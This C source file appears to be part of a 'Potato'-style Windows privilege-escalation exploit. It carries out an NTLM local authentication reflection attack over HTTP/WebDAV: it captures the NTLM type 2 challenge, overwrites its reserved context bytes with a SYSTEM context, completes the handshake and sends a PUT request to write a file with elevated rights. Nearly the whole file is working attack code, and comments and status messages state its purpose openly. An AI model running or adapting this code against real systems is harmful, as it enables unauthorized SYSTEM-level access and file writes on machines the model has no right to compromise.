#define SECURITY_WIN32 
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996)

#include "windows.h"
#include "stdio.h"
#include "winsock.h"
#include "sspi.h"
#include "Security.h"
#include "HTTPClient.h"


// global vars
extern wchar_t* httpHost;
extern wchar_t* httpPageUrl;
extern HANDLE event1;
extern HANDLE event2;
extern HANDLE event3;
extern char SystemContext[];
extern char UserContext[];

SOCKET ConnectSocket2(const wchar_t* ipAddress, int port);
BOOL DoAuthenticatedGETHTTP(SOCKET s, wchar_t* httpPageUrl);
BOOL GenClientContext2(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText);
char* base64Encode(char* text, int textLen, int* b64Len);
char* base64Decode(char* b64Text, int b64TextLen, int* bufferLen);
int findBase64NTLM(char* buffer, int buffer_len, char* outbuffer, int* outbuffer_len);
char* ForgeHTTPRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len, wchar_t* httpIp, wchar_t* httpUrlPage);
char* ForgeHTTPWebDavRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len, wchar_t* httpIp, wchar_t* httpUrlPage);
char* ForgeHTTPWebDavRequestType0(int *l,wchar_t* httpIp, wchar_t* httpUrlPage);
void ExtractType2FromHttp(char* httpPacket, int httpPacketLen, char* ntlmType2, int* ntlmType2Len);
char* ForgeHTTPRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len, wchar_t* httpIp, wchar_t* httpUrlPage);
char* ForgeHTTPWebDavRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len, wchar_t* httpIp, wchar_t* httpUrlPage);
char* ForgeHTTPWebDavRequestWrite(int* l, wchar_t* httpIp, wchar_t* httpUrlPage);
char* ForgeHTTPWebDavRequestHead(int* l, wchar_t* httpIp, wchar_t* httpUrlPage);


void HTTPAuthenticatedGET() {
    SOCKET httpSocket = ConnectSocket2(httpHost, 80);
    DoAuthenticatedGETHTTP(httpSocket, httpPageUrl);
    closesocket(httpSocket);
}

BOOL DoAuthenticatedGETHTTP(SOCKET s, wchar_t* httpPageUrl) {
    BOOL fDone = FALSE;
    DWORD cbOut = 0;
    DWORD cbIn = 0;
    PBYTE pInBuf;
    PBYTE pOutBuf;
    char* sendbuffer = NULL;
    char ntlmType2[DEFAULT_BUFLEN];
    char recBuffer[DEFAULT_BUFLEN];
    int len = 0;
    int reclen = 0;
    CredHandle hCred;
    struct _SecHandle  hcText;

    pInBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
    pOutBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
    cbOut = DEFAULT_BUFLEN;
    
    //ntlm type 1 http auth
    if (!GenClientContext2(NULL, 0, pOutBuf, &cbOut, &fDone, (wchar_t*)L"", &hCred, &hcText))
    {
        return(FALSE);
    }
    sendbuffer = ForgeHTTPWebDavRequestType0(&len, httpHost, httpPageUrl);
    send(s, sendbuffer, len, 0);
    reclen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    
    sendbuffer = ForgeHTTPWebDavRequestType1((char*)pOutBuf, cbOut, &len, httpHost, httpPageUrl);
    send(s, sendbuffer, len, 0);

    // handling ntlm type2 part with context swapping
    reclen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    ExtractType2FromHttp(recBuffer, reclen, ntlmType2, &len);

    if (ntlmType2[8] == 2)
    {
        memcpy(UserContext, &ntlmType2[32], 8);
        WaitForSingleObject(event1, INFINITE);
        // for local auth reflection we don't really need to relay the entire packet 
        // swapping the context in the Reserved bytes with the SYSTEM context is enough
        memcpy(&ntlmType2[32], SystemContext, 8);
        printf("[+] HTTP Client Auth Context swapped with SYSTEM \n");
    }
    else {
        printf("[!] Authentication over HTTP is not using NTLM. Exiting...\n");
        return FALSE;
    }
    cbOut = DEFAULT_BUFLEN;
    if (!GenClientContext2((BYTE*)ntlmType2, len, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)L"", &hCred, &hcText))
        exit(-1);
    SetEvent(event2);
    WaitForSingleObject(event3, INFINITE);

    // handling ntlm type3
    sendbuffer = ForgeHTTPWebDavRequestType3((char*)pOutBuf, cbOut, &len, httpHost, httpPageUrl);
    send(s, sendbuffer, len, 0);

    // getting response from server
    reclen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    /*if (recBuffer[9] == '2' && recBuffer[10] == '0' && recBuffer[11] == '0') {
        printf("[+] HTTP reflected DCOM authentication succeeded!\n");
    }
    else {
        printf("[!] HTTP reflected DCOM authentication failed \n");
        return FALSE;
    }*/
    sendbuffer = ForgeHTTPWebDavRequestWrite(&len, httpHost, httpPageUrl);
    printf("%s %d\n", sendbuffer, len);
    send(s, sendbuffer, len, 0);

    reclen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
    if (recBuffer[9] == '2' && recBuffer[10] == '0' && recBuffer[11] == '1') {
        printf("[+] File write succeeded!\n");
    }
    else {
        printf("[!] File creation Failed \n");
     
    }

    free(pInBuf);
    free(pOutBuf);
    if(sendbuffer != NULL) free(sendbuffer);
    return TRUE;
}

SOCKET ConnectSocket2(const wchar_t* ipAddress, int port) {
    char ipAddress_a[20];
    char remotePort_a[12];
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup function failed with error: %d\n", iResult);
        return 1;
    }
    SOCKET ConnectSocket;
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    memset(remotePort_a, 0, 12);
    memset(ipAddress_a, 0, 20);
    wcstombs(ipAddress_a, ipAddress, 20);
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(ipAddress_a);
    clientService.sin_port = htons(port);
    iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"[!] ConnectSocket: connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(ConnectSocket);
        if (iResult == SOCKET_ERROR)
            wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    Sleep(1000);
    printf("[*] Connected to the HTTP server with ip %s and port %d\n", ipAddress_a, port);
    return ConnectSocket;
}

BOOL GenClientContext2(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText)
{
    SECURITY_STATUS ss;
    TimeStamp  Lifetime;
    SecBufferDesc OutBuffDesc;
    SecBuffer OutSecBuff;
    SecBufferDesc InBuffDesc;
    SecBuffer InSecBuff;
    ULONG ContextAttributes;
    PTCHAR lpPackageName = (PTCHAR)NTLMSP_NAME;

    if (NULL == pIn)
    {
        ss = AcquireCredentialsHandle(NULL, lpPackageName, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, hCred, &Lifetime);
        if (!(SEC_SUCCESS(ss)))
        {
            printf("[!] AcquireCredentialsHandleW failed with error code 0x%x\n", ss);
            return FALSE;
        }
    }
    OutBuffDesc.ulVersion = 0;
    OutBuffDesc.cBuffers = 1;
    OutBuffDesc.pBuffers = &OutSecBuff;
    OutSecBuff.cbBuffer = *pcbOut;
    OutSecBuff.BufferType = SECBUFFER_TOKEN;
    OutSecBuff.pvBuffer = pOut;
    if (pIn)
    {
        InBuffDesc.ulVersion = 0;
        InBuffDesc.cBuffers = 1;
        InBuffDesc.pBuffers = &InSecBuff;
        InSecBuff.cbBuffer = cbIn;
        InSecBuff.BufferType = SECBUFFER_TOKEN;
        InSecBuff.pvBuffer = pIn;
        ss = InitializeSecurityContext(hCred, hcText, (SEC_WCHAR*)pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP, &InBuffDesc, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);

    }
    else
        ss = InitializeSecurityContext(hCred, NULL, (SEC_WCHAR*)pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP, NULL, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);
    if (!SEC_SUCCESS(ss))
    {
        printf("[!] InitializeSecurityContext failed with error code 0x%x\n", ss);
        return FALSE;
    }
    if ((SEC_I_COMPLETE_NEEDED == ss)
        || (SEC_I_COMPLETE_AND_CONTINUE == ss))
    {
        ss = CompleteAuthToken(hcText, &OutBuffDesc);
        if (!SEC_SUCCESS(ss))
        {
            fprintf(stderr, "complete failed: 0x%08x\n", ss);
            return FALSE;
        }
    }
    *pcbOut = OutSecBuff.cbBuffer;
    *pfDone = !((SEC_I_CONTINUE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss));
    return TRUE;
}

char* base64Encode(char* text, int textLen, int* b64Len) {
    *b64Len = DEFAULT_BUFLEN;
    char* b64Text = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *b64Len);
    if (!CryptBinaryToStringA((const BYTE*)text, textLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Text, (DWORD*)b64Len)) {
        printf("CryptBinaryToStringA failed with error code %d", GetLastError());
        HeapFree(GetProcessHeap(), 0, b64Text);
        b64Text = NULL;
        exit(-1);
    }
    return b64Text;
}

char* base64Decode(char* b64Text, int b64TextLen, int* bufferLen) {
    *bufferLen = DEFAULT_BUFLEN;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *bufferLen);
    if (!CryptStringToBinaryA((LPCSTR)b64Text, b64TextLen, CRYPT_STRING_BASE64, (BYTE*)buffer, (DWORD*)bufferLen, NULL, NULL)) {
        printf("CryptStringToBinaryA failed with error code %d", GetLastError());
        HeapFree(GetProcessHeap(), 0, buffer);
        buffer = NULL;
        exit(-1);
    }
    return buffer;
}

int findBase64NTLM(char* buffer, int buffer_len, char* outbuffer, int* outbuffer_len) {
    char pattern_head[] = { 'N', 'T', 'L', 'M', ' ' };
    char pattern_tail[2] = { 0x0D, 0x0A }; // \r\n
    int index_start = 0;
    for (int i = 0; i < buffer_len; i++) {
    }
    for (int i = 0; i < buffer_len; i++) {
        if (buffer[i] == pattern_head[index_start]) {
            index_start = index_start + 1;
            if (index_start == sizeof(pattern_head)) {
                index_start = i + 1;
                break;
            }
        }
    }
    *outbuffer_len = 0;
    for (int i = index_start; i < buffer_len; i++) {
        if (buffer[i] == pattern_tail[0] && buffer[i + 1] == pattern_tail[1]) {
            break;
        }
        outbuffer[(*outbuffer_len)] = buffer[i];
        *outbuffer_len = (*outbuffer_len) + 1;
    }
    return 0;
}

char* ForgeHTTPRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len, wchar_t* httpIp, wchar_t* httpUrlPage) {
    char httpPacketTemplate[] = "GET %s HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\n\r\n";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char httpIp_a[20];
    char httpUrlPage_a[1024];
    memset(httpIp_a, 0, 20);
    memset(httpUrlPage_a, 0, 1024);
    wcstombs(httpIp_a, httpIp, 20);
    wcstombs(httpUrlPage_a, httpUrlPage, 1024);
    char* b64ntlmTmp = base64Encode(ntlmsspType1, ntlmsspType1Len, &b64ntlmLen);
    char b64ntlm[DEFAULT_BUFLEN];
    memset(b64ntlm, 0, DEFAULT_BUFLEN);
    memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
    *httpPacketType1Len = sprintf(httpPacket, httpPacketTemplate, httpUrlPage_a, httpIp_a, b64ntlm);
    return httpPacket;
}

char* ForgeHTTPWebDavRequestType0(int *l,wchar_t* httpIp, wchar_t* httpUrlPage) {
    char httpPacketTemplate[] = "PROPFIND %s HTTP/1.1\r\nHost: %s\r\n\r\n";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char httpIp_a[20];
    char httpUrlPage_a[1024];
    memset(httpIp_a, 0, 20);
    memset(httpUrlPage_a, 0, 1024);
    wcstombs(httpIp_a, httpIp, 20);
    wcstombs(httpUrlPage_a, httpUrlPage, 1024);
    *l=sprintf(httpPacket, httpPacketTemplate, httpUrlPage_a, httpIp_a);
    return httpPacket;
}

char* ForgeHTTPWebDavRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len, wchar_t* httpIp, wchar_t* httpUrlPage) {
    char httpPacketTemplate[] = "HEAD %s HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\nConnection: Keep-Alive\r\n\r\n";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char httpIp_a[20];
    char httpUrlPage_a[1024];
    memset(httpIp_a, 0, 20);
    memset(httpUrlPage_a, 0, 1024);
    wcstombs(httpIp_a, httpIp, 20);
    wcstombs(httpUrlPage_a, httpUrlPage, 1024);
    char* b64ntlmTmp = base64Encode(ntlmsspType1, ntlmsspType1Len, &b64ntlmLen);
    char b64ntlm[DEFAULT_BUFLEN];
    memset(b64ntlm, 0, DEFAULT_BUFLEN);
    memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
    *httpPacketType1Len = sprintf(httpPacket, httpPacketTemplate, httpUrlPage_a, httpIp_a, b64ntlm);
    return httpPacket;
}

void ExtractType2FromHttp(char* httpPacket, int httpPacketLen, char* ntlmType2, int* ntlmType2Len) {
    char b64Type2[DEFAULT_BUFLEN];
    int b64Type2Len = 0;
    findBase64NTLM(httpPacket, httpPacketLen, b64Type2, &b64Type2Len);
    printf("b64type=%s\n", b64Type2);
    char* decodedType2Tmp = base64Decode(b64Type2, b64Type2Len, ntlmType2Len);
    printf("decodes=%s\n", decodedType2Tmp);
    memset(ntlmType2, 0, DEFAULT_BUFLEN);
    memcpy(ntlmType2, decodedType2Tmp, *ntlmType2Len);
    printf("decodes=%s\n", ntlmType2);
}

char* ForgeHTTPWebDavRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len, wchar_t* httpIp, wchar_t* httpUrlPage) {
    char httpPacketTemplate[] = "HEAD %s HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\nConnection: Keep-Alive\r\n\r\n";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char httpIp_a[20];
    char httpUrlPage_a[1024];
    memset(httpIp_a, 0, 20);
    memset(httpUrlPage_a, 0, 1024);
    wcstombs(httpIp_a, httpIp, 20);
    wcstombs(httpUrlPage_a, httpUrlPage, 1024);
    char* b64ntlmTmp = base64Encode(ntlmsspType3, ntlmsspType3Len, &b64ntlmLen);
    char b64ntlm[DEFAULT_BUFLEN];
    memset(b64ntlm, 0, DEFAULT_BUFLEN);
    memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
    *httpPacketType3Len = sprintf(httpPacket, httpPacketTemplate, httpUrlPage_a, httpIp_a, b64ntlm);
    return httpPacket;
}
char* ForgeHTTPRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len, wchar_t* httpIp, wchar_t* httpUrlPage) {
    char httpPacketTemplate[] = "GET %s HTTP/1.1\r\nHost: %s\r\nAuthorization: NTLM %s\r\nConnection: Keep-Alive\r\n\r\n";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char httpIp_a[20];
    char httpUrlPage_a[1024];
    memset(httpIp_a, 0, 20);
    memset(httpUrlPage_a, 0, 1024);
    wcstombs(httpIp_a, httpIp, 20);
    wcstombs(httpUrlPage_a, httpUrlPage, 1024);
    char* b64ntlmTmp = base64Encode(ntlmsspType3, ntlmsspType3Len, &b64ntlmLen);
    char b64ntlm[DEFAULT_BUFLEN];
    memset(b64ntlm, 0, DEFAULT_BUFLEN);
    memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
    *httpPacketType3Len = sprintf(httpPacket, httpPacketTemplate, httpUrlPage_a, httpIp_a, b64ntlm);
    return httpPacket;
}

char* ForgeHTTPWebDavRequestWrite(int* l, wchar_t* httpIp, wchar_t* httpUrlPage) {
    char httpPacketTemplate[] = "PUT %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 23\r\nConnection: Keep-Alive\r\n\r\nwe always love potatoes";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char httpIp_a[20];
    char httpUrlPage_a[1024];
    memset(httpIp_a, 0, 20);
    memset(httpUrlPage_a, 0, 1024);
    wcstombs(httpIp_a, httpIp, 20);
    wcstombs(httpUrlPage_a, httpUrlPage, 1024);
    *l = sprintf(httpPacket, httpPacketTemplate, httpUrlPage_a, httpIp_a);
    return httpPacket;
}
char* ForgeHTTPWebDavRequestHead(int* l, wchar_t* httpIp, wchar_t* httpUrlPage) {
    char httpPacketTemplate[] = "PROPPATCH %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 26\r\nConnection: Keep-Alive\r\n\r\nwe always love potatoes";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char httpIp_a[20];
    char httpUrlPage_a[1024];
    memset(httpIp_a, 0, 20);
    memset(httpUrlPage_a, 0, 1024);
    wcstombs(httpIp_a, httpIp, 20);
    wcstombs(httpUrlPage_a, httpUrlPage, 1024);
    *l = sprintf(httpPacket, httpPacketTemplate, httpUrlPage_a, httpIp_a);
    return httpPacket;
}
